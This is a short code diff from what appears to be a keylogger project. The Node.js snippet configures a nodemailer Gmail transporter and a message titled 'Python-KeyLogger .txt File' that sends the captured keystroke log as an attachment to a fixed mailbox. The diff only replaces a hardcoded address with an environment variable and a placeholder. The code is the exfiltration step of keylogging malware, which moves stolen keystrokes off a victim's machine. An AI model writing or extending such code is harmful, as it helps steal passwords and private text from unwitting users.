@@ -6,14 +6,14 @@ require('dotenv').config()
 var transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-        user: 'legaminglpytube@gmail.com',
+        user: process.env.MAIL,
         pass: process.env.ACCESS_KEY
     }
 });
 
 var mailOptions = {
-    from: 'legaminglpytube@gmail.com',
-    to: 'legaminglpytube@gmail.com',
+    from: 'mail@gmail.com',
+    to: 'mail@gmail.com',
     subject: 'Python-KeyLogger .txt File',
 
     attachments: [
